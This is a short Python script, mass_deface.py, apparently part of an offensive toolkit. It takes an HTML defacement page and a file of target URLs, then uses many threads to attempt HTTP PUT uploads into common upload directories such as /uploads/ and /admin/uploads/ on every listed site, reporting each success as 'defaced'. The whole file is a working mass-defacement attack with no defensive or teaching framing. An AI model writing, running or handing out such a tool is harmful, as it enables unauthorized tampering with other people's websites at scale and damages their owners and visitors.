# mass_deface.py
import requests
import threading
import settings
import os

def deface(target_url, deface_file_path):
    try:
        if not os.path.isfile(deface_file_path):
            print(f"{settings.COLOR_RED}[!] Deface file not found!{settings.COLOR_END}")
            return

        with open(deface_file_path, "rb") as f:
            deface_content = f.read()

        upload_paths = [
            "/uploads/",
            "/upload/",
            "/images/",
            "/img/",
            "/admin/uploads/",
            "/assets/uploads/",
            "/file_upload/",
        ]

        for path in upload_paths:
            url = target_url.rstrip("/") + path + os.path.basename(deface_file_path)
            r = requests.put(url, data=deface_content, timeout=settings.DEFAULT_TIMEOUT)
            if r.status_code in [200, 201, 202]:
                print(f"{settings.COLOR_GREEN}[+] Successfully defaced: {url}{settings.COLOR_END}")
                return
    except Exception as e:
        print(f"{settings.COLOR_RED}[!] Error attacking {target_url}: {e}{settings.COLOR_END}")

def mass_deface(deface_file_path, targets_file):
    if not os.path.isfile(targets_file):
        print(f"{settings.COLOR_RED}[!] Targets file not found!{settings.COLOR_END}")
        return

    with open(targets_file, "r") as f:
        targets = f.read().splitlines()

    threads = []

    for target in targets:
        if target.strip():
            t = threading.Thread(target=deface, args=(target, deface_file_path))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    print(f"{settings.COLOR_GREEN}[✓] Mass defacement attempt finished.{settings.COLOR_END}")

def launch_mass_deface():
    deface_file_path = input("Path to deface file (HTML): ").strip()
    targets_file = input("Path to targets list (one URL per line): ").strip()
    mass_deface(deface_file_path, targets_file)

if __name__ == "__main__":
    launch_mass_deface()
